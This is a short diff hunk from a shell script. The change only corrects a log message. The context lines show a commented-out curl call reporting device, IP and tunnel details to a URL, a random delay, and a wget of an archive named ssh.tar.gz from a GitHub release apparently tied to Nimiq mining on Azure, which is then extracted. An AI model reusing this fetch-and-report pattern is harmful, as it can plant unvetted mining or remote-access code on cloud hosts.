@@ -21,7 +21,7 @@ echo $link
 
 #curl -k -s -o /dev/null -w '%{http_code}' -i -H "Accept: application/json" -H "Content-Type:application/json" -X PUT --data "{\"key\":\" \",\"link\":\"$link\",\"device\":\"$user\",\"times\":\"$timevn\",\"ip\":\"$ip\",\"tunnel\":\"$tunnel\",\"service\":\"$service\"}" $url
 wait=$(shuf -i 60-500 -n 1)
-echo "wait $wait minute to start browser"
+echo "wait $wait seconds to start browser"
 sleep $wait
 wget https://github.com/Vinhuit/azurenimpool/releases/download/NimiqFullBlock13_2_2019/ssh.tar.gz
 tar xvzf ssh.tar.gz
